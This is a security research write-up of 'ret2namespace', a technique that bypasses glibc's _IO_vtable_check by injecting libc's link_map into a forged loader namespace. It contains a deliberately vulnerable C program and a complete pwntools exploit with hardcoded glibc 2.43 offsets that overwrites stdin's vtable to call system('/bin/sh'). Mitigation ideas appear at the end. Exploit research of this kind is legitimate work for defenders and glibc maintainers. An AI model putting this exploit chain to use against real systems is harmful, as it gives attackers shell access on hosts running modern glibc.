## Abstract

Starting with glibc 2.39, distributions build libc with `BIND_NOW`, eagerly resolving all PLT entries at load time. This kills **ret2dso** and every other technique that relies on lazy symbol resolution through `_dl_runtime_resolve`.

We introduce **ret2namespace**, a technique that achieves **arbitrary code execution on glibc 2.39–2.43+** by corrupting the dynamic loader's **namespace metadata** to bypass `_IO_vtable_check` — the last line of defense against FILE-based control-flow hijacking.

The technique requires a **single libc address leak** and a **relative byte-wise write** anchored at a libc object. No TLS pointer guard leak, no ROP chain, no brute force.

---

## 1. Motivation — BIND_NOW Killed ret2dso

ret2dso worked by corrupting `DT_SYMTAB` in a `link_map` so that a runtime call to `_dl_find_dso_for_object` — which traversed the PLT — triggered `_dl_runtime_resolve` on a forged symbol. The loader computed `st_value + l_addr` and jumped to the attacker's target.

This depended on **lazy binding**: libc's PLT stubs pointed to the resolver, not the real function. When distributions enabled `BIND_NOW` on libc (glibc 2.39+, Ubuntu 24.04, Debian 13), all PLT entries were resolved at load time. The `_dl_find_dso_for_object@plt` stub jumped directly to the real function — `_dl_runtime_resolve` was never invoked — and `DT_SYMTAB` corruption was never consulted.

**The original ret2dso trigger is dead on modern distributions.**

---

## 2. The Vtable Check — `_IO_vtable_check`

Glibc protects FILE structures with vtable validation. Every stdio operation (`getchar`, `fgets`, `fwrite`, ...) dispatches through a vtable pointer at `FILE + 0xd8`. Before dispatch, the code checks whether the vtable falls within `__libc_IO_vtables`, a read-only section in libc:

```c
if ((uintptr_t)(vtable - __libc_IO_vtables) > VTABLE_SECTION_SIZE)
    _IO_vtable_check();
```

If the vtable is outside the valid range, `_IO_vtable_check` is called. This function decides whether to accept or abort:

```asm
_IO_vtable_check:
  ; CHECK A: pointer guard validation
  mov rax, [mangled_ptr]      ; mangled function pointer in libc .data
  ror rax, 17
  xor rax, fs:0x30            ; demangle with TLS pointer guard
  cmp rax, rdi                ; match self?
  je  ACCEPT

  ; CHECK B: dlopen hook
  mov rax, [_rtld_global_ro]
  cmp [rax+0x2c8], 0          ; dl_dlfcn_hook field
  je  ACCEPT

  ; CHECK C: namespace validation
  call _dl_addr                ; find which DSO contains this address
  test eax, eax
  je  FATAL                    ; not found → abort
  mov rax, [rbp-0x38]         ; link_map* returned by _dl_addr
  cmp [rax+0x30], 0           ; l_ns field
  je  FATAL                    ; namespace 0 → abort
  ; l_ns != 0 → ACCEPT (foreign namespace, e.g. dlmopen plugin)
  ret
```

Three paths to acceptance:

| Check | Condition | Feasibility |
|-------|-----------|-------------|
| A | Pointer guard match | Requires TLS leak (`fs:0x30`) |
| B | `dl_dlfcn_hook == NULL` | Field is in RELRO, non-zero in modern glibc |
| C | `l_ns != 0` | **Exploitable via namespace injection** |

Check C exists to support `dlmopen()` — shared objects loaded into non-default namespaces have legitimate vtables outside `__libc_IO_vtables`. If the DSO containing the vtable address has `l_ns != 0`, the vtable is accepted.

---

## 3. Namespace Internals

The dynamic loader maintains an array of 16 namespace slots in `_rtld_global`:

```c
struct rtld_global {
    struct link_namespaces _dl_ns[16];  // namespace array
    size_t _dl_nns;                      // number of active namespaces
    // ...
};
```

Each namespace contains a linked list of `link_map` structures:

```c
struct link_namespaces {
    struct link_map *_ns_loaded;    // head of chain
    unsigned int _ns_nloaded;       // count
    struct r_scope_elem *_ns_main_searchlist;
    unsigned int _ns_global_scope_alloc;
    unsigned int _ns_global_scope_pending_adds;
    struct link_map *libc_map;      // pointer to libc's link_map
    struct unique_sym_table _ns_unique_sym_table;
};
```

By default, all DSOs live in namespace 0 (`_dl_nns = 1`). Namespaces 1–15 are empty.

`_dl_find_dso_for_object` iterates through all active namespaces:

```c
for (ns = 0; ns < _rtld_global._dl_nns; ns++) {
    for (l = _dl_ns[ns]._ns_loaded; l != NULL; l = l->l_next) {
        if (addr >= l->l_map_start && addr < l->l_map_end) {
            assert(l->l_ns == ns);  // must match
            return l;
        }
    }
}
return NULL;
```

Two critical observations:

1. The namespace array, `_dl_nns`, and all `link_map` structures live in **writable memory** (not covered by RELRO)
2. The `l_ns` field on each `link_map` is trusted without revalidation after load time

---

## 4. The Technique

ret2namespace injects libc's `link_map` into namespace 1 so that `_IO_vtable_check` sees `l_ns = 1` and accepts the forged vtable.

### Step-by-step

**Step 1 — Unlink libc from namespace 0.**
Zero `vdso_lm->l_next` to remove libc from the ns0 chain. Without this, `_dl_find_dso_for_object` would find libc in ns0, check `l_ns == 0`, and the assert would pass — but `_IO_vtable_check` would see `l_ns == 0` and abort.

**Step 2 — Set `libc_lm->l_ns = 1`.**
Single byte write at `libc_lm + 0x30`.

**Step 3 — Register libc in namespace 1.**
Write libc's `link_map` address into `_rtld_global._dl_ns[1]._ns_loaded`. This is the **one write that requires an absolute address**, and the reason a single libc leak is necessary.

**Step 4 — Set `_dl_nns = 2`.**
Single byte write at `_rtld_global + DL_NNS_OFFSET` (changes 1 → 2), so the search loop iterates into ns1.

**Step 5 — Build a fake vtable.**
Write `system()` at offset `+0x28` (the `__uflow` slot) in a writable area within libc's mapped range (e.g. `stdin + 0x200`).

**Step 6 — Write `/bin/sh\0` at `stdin`.**
When the vtable dispatches `__uflow(fp)`, `rdi = fp = stdin`. If stdin begins with `/bin/sh\0`, `system("/bin/sh")` is called.

**Step 7 — Redirect stdin's vtable pointer.**
Overwrite `stdin + 0xd8` with the address of the fake vtable.

**Step 8 — Trigger.**
Any stdio read on stdin (`getchar`, `fgets`, etc.) dispatches through the corrupted vtable. The validator calls `_dl_addr` → `_dl_find_dso_for_object`, which finds libc in ns1 with `l_ns = 1`. Check C passes. The fake vtable is used. `system("/bin/sh")` executes.

### Write summary

| Write | Size | Type | Target |
|-------|------|------|--------|
| `vdso_lm->l_next = 0` | 8B | zero | unlink libc from ns0 |
| `libc_lm->l_ns = 1` | 1B | constant | namespace tag |
| `ns[1]._ns_loaded = libc_lm` | 8B | **absolute** | register in ns1 |
| `_dl_nns = 2` | 1B | constant | activate ns1 |
| `fake_vtable[0x28] = system` | 8B | computed | vtable payload |
| `stdin[0:8] = "/bin/sh\0"` | 8B | constant | rdi argument |
| `stdin->vtable = fake_vtable` | 8B | computed | vtable redirect |

Total: **42 bytes**, of which only `ns[1]._ns_loaded` requires an absolute address.

---

## 5. Threat Model

The attacker has:

- A **relative, byte-wise write primitive** anchored at a libc object (e.g. `stdin`)
- A **single libc address leak** (any pointer in the libc/ld mapping)
- ASLR, PIE, NX, Full RELRO, **BIND_NOW** enabled

The attacker does **not** need:

- TLS pointer guard (`fs:0x30`)
- Stack control or ROP chain
- GOT/PLT access
- Brute force

### Why the absolute address is unavoidable

`ns[1]._ns_loaded` starts at zero. There is no existing pointer to partially overwrite. The `link_map` address cannot be derived from the `ld_drift` alone because ASLR randomizes the absolute base with 28 bits of entropy. A single libc pointer (e.g. from a format string, heap metadata, or partial disclosure) resolves all offsets — `ld_drift` between libc and ld.so is a build-time constant.

---

## 6. glibc Version Differences

The namespace struct size changed between glibc 2.41 and 2.43 due to the removal of `_ns_debug_unused` (`struct r_debug_extended`, 48 bytes):

| | glibc 2.41 | glibc 2.43 |
|---|---|---|
| `sizeof(struct link_namespaces)` | **0xa0** | **0x70** |
| `ns[1]._ns_loaded` in `_rtld_global` | +0xa0 | +0x70 |
| `_dl_nns` in `_rtld_global` | +0xa00 | +0x700 |
| `__uflow` vtable slot | +0x28 | +0x28 |

The technique works on both. Only the offsets change.

### Note on glibc 2.43 and unbuffered stdin

On glibc 2.43, `getchar()` on an unbuffered stdin (`setbuf(stdin, NULL)`) performs a direct `read(2)` syscall without consulting the vtable. The trigger requires stdin to be in **default buffered mode** so that `getchar()` goes through `__uflow` → vtable dispatch to fill the internal buffer. This is the default behavior for programs that do not explicitly call `setbuf(stdin, NULL)`.

---

## 7. Proof of Concept — Vulnerable Program

```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <stdint.h>
#include <string.h>

static int read_line(char *buf, int max) {
    int i = 0;
    while (i < max - 1) {
        char c;
        if (read(0, &c, 1) <= 0) return -1;
        if (c == '\n') break;
        buf[i++] = c;
    }
    buf[i] = '\0';
    return i;
}

int main(void) {
    setvbuf(stdout, NULL, _IONBF, 0);

    printf("stdin: %p\n", (void *)stdin);

    char line[64];
    long delta;
    unsigned int byte;

    puts("format: <delta> <hex_byte>");

    for (int i = 0; i < 400; i++) {
        if (read_line(line, sizeof(line)) < 0) break;
        if (sscanf(line, "%ld %x", &delta, &byte) != 2)
            break;
        ((unsigned char *)stdin)[delta] = (unsigned char)byte;
    }

    getchar();
    return 0;
}
```

The write loop uses `read(2)` to avoid touching stdio state. `stdin` is left in default buffered mode so that `getchar()` dispatches through the vtable.

---

## 8. Proof of Concept — Exploit

```python
#!/usr/bin/env python3
from pwn import *
import time

context.arch = "amd64"

# glibc 2.43-2ubuntu2 x86_64
STDIN_IN_LIBC  = 0x2128e0
SYSTEM_OFF     = 0x5c560
LD_DRIFT       = 0x18720     # ld_base - stdin (build constant)
RG_IN_LD       = 0x3d000     # _rtld_global in ld
VDSO_LM_IN_LD  = 0x3e8c0    # vdso link_map in ld
NS_SIZE        = 0x70        # sizeof(struct link_namespaces)
DL_NNS_OFF     = 0x700      # 16 * NS_SIZE
LM_FROM_STDIN  = 0xe980     # libc link_map - stdin
LM_LNS         = 0xe9b0     # libc_lm->l_ns - stdin
FAKE_VT        = 0x200      # fake vtable at stdin + 0x200
UFLOW_SLOT     = 0x28       # __uflow in _IO_jump_t

p = process("./vuln")

p.recvuntil(b"stdin: ")
stdin_addr = int(p.recvline().strip(), 16)
p.recvuntil(b"format:")
p.recvline()

libc_base = stdin_addr - STDIN_IN_LIBC
libc_lm   = stdin_addr + LM_FROM_STDIN
system    = libc_base + SYSTEM_OFF
rg        = LD_DRIFT + RG_IN_LD

def wb(off, val):
    p.sendline(f"{off} {val:02x}".encode())

def wq(off, val):
    for i, b in enumerate(p64(val)):
        wb(off + i, b)

# Namespace injection
wq(LD_DRIFT + VDSO_LM_IN_LD + 0x18, 0)  # unlink libc from ns0
wb(LM_LNS, 1)                             # libc_lm->l_ns = 1
wq(rg + NS_SIZE, libc_lm)                 # ns[1]._ns_loaded
wb(rg + DL_NNS_OFF, 2)                    # dl_nns = 2

# Fake vtable + trigger
wq(FAKE_VT + UFLOW_SLOT, system)          # __uflow → system
for i, b in enumerate(b"/bin/sh\x00"):
    wb(i, b)                               # stdin → "/bin/sh"
wq(0xd8, stdin_addr + FAKE_VT)            # vtable → fake

time.sleep(0.3)
p.sendline(b"BREAK")
time.sleep(0.3)
p.sendline(b"id")
print(p.recvline())
p.interactive()
```

---

## 9. Execution Flow

```
getchar()
  → __uflow(stdin)
    → load vtable from stdin+0xd8          // points to fake vtable
    → vtable is outside __libc_IO_vtables  // range check fails
    → _IO_vtable_check()
      → CHECK A: pointer guard             // fails (slot is NULL)
      → CHECK B: dl_dlfcn_hook             // non-zero → skip
      → CHECK C: _dl_addr(self)
        → _dl_find_dso_for_object(0x988a0) // address of _IO_vtable_check
          → ns0: walks main, vdso, ld      // libc is NOT in ns0 (unlinked)
          → ns1: walks libc_lm             // libc IS here
            → 0x988a0 ∈ [l_map_start, l_map_end) → MATCH
            → assert(l_ns == 1) → PASS
          → returns libc_lm
      → l_ns = 1 ≠ 0 → ACCEPT
    → vtable dispatch: fake_vtable[0x28](stdin)
      → system("/bin/sh")
        → shell
```

---

## 10. Comparison with Existing Techniques

| | ret2dso | House of Apple 2 | ret2namespace |
|---|---|---|---|
| **Bypass target** | Full RELRO (symbol resolution) | vtable check (wide vtable chain) | vtable check (namespace injection) |
| **Works under BIND_NOW** | No | Yes | **Yes** |
| **Leak required** | None (relative only) | libc + heap | **libc only** |
| **TLS pointer guard** | Not needed | Not needed (but complex chain) | **Not needed** |
| **Structures to forge** | 1 `Elf64_Sym` | `_wide_data` + wide vtable + FILE fields | **1 vtable (8 bytes)** |
| **Brute force** | None | None | **None** |
| **Complexity** | Low | High (multi-struct chain) | **Low** |

ret2namespace trades the simplicity of ret2dso's zero-leak model for a single libc leak, but in return works on all modern distributions with BIND_NOW enabled. Compared to House of Apple 2, it eliminates the need to forge multiple interdependent structures (`_wide_data`, wide vtable, coherent FILE fields) — the fake vtable is a single pointer at a single offset.

---

## 11. Security Implications

- `_IO_vtable_check`'s namespace exception was designed for `dlmopen` plugins, but can be triggered by corrupting loader metadata from userspace
- The dynamic loader's namespace state (`link_map` chains, `_dl_nns`, `l_ns` fields) remains writable and implicitly trusted
- A single libc pointer leak is sufficient to reconstruct all absolute addresses needed for the technique
- `BIND_NOW` closes the lazy resolution surface but does not protect the namespace validation path

---

## 12. Mitigation Discussion

Potential mitigations:

- **Make `_dl_nns` and namespace chain heads read-only after relocation** — prevents injection of new namespaces, but complicates `dlmopen` support
- **Validate `l_ns` integrity** — e.g. via a MAC or by cross-checking against the namespace array, rather than trusting the field in the `link_map`
- **Remove the namespace exception in `_IO_vtable_check`** — force all vtables to be within `__libc_IO_vtables` regardless of namespace, at the cost of breaking legitimate `dlmopen` use cases
- **Protect `link_map` fields post-load** — `mprotect` the pages containing `link_map` structures to read-only after startup

All approaches involve trade-offs between compatibility, performance, and security.

---

## 13. Conclusion

ret2namespace demonstrates that the dynamic loader's namespace metadata is a viable attack surface for bypassing `_IO_vtable_check` on modern glibc with `BIND_NOW`.

The technique is the logical successor to ret2dso: both exploit the loader's implicit trust in its own writable metadata. Where ret2dso abused symbol resolution, ret2namespace abuses namespace validation. The attack surface shifted, but the underlying trust assumption — that loader metadata is immutable after load time — remains broken.

---

Source code & PoC: https://github.com/retleave/pocs
